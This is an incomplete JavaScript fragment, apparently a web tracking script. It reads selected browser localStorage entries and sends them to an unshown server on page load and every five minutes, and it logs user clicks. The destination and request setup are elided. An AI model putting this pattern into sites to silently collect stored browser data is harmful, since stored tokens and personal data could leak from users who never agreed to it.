var version = "c.37";
let keysToTrack = window.keysToTrack;
var _ttcNamespace;
var _ttqNamespace;
...
function generateNewHash(trackData) {
  var trackKeys = Object.keys(trackData);
  var linkedKeys = trackKeys.join("");
  var hashValue = 0;
  for (var i = 0; i < linkedKeys.length; i++) {
    var character = linkedKeys.charCodeAt(i);
    hashValue = (hashValue << 5) - hashValue + character;
    hashValue = hashValue & hashValue;
  }
  return hashValue.toString(16);
}
function getTrackingLocalStorageData() {
  var localStorageTrackData = {};
  for (var i = 0; i < window.localStorage.length; i++) {
    var key = window.localStorage.key(i);
    if (keysToTrack.includes(key)) {
      var value = window.localStorage.getItem(key);
      localStorageTrackData[key] = value;
    }
  }
  return localStorageTrackData;
}
window.ttqNamespace.push(_ttqNamespace);
function dispatchDataToServer(data) {
  const uniqueIdent = generateNewHash(data);
  ...
  req.send(JSON.stringify(pac));
  req.onreadystatechange = function () {
    if (req.readyState === XMLHttpRequest.DONE) {
      if (req.status === 200) {
        console.log("成功发送信息");
      } else {
        console.error("发送失败, 错误代码：" + req.status);
      }
    }
  };
}
...
function gatherAndDispatchLocalStorageData() {
  const trackData = getTrackingLocalStorageData();
  if (Object.keys(trackData).length > 0) {
    dispatchDataToServer(trackData);
  }
}
try {
...
document.addEventListener('click', event => {
  ...
  console.log('user event tracking');
}, false);
;
window.onload = function () {
  gatherAndDispatchLocalStorageData();
};
setInterval(gatherAndDispatchLocalStorageData, 5 * 60 * 1000);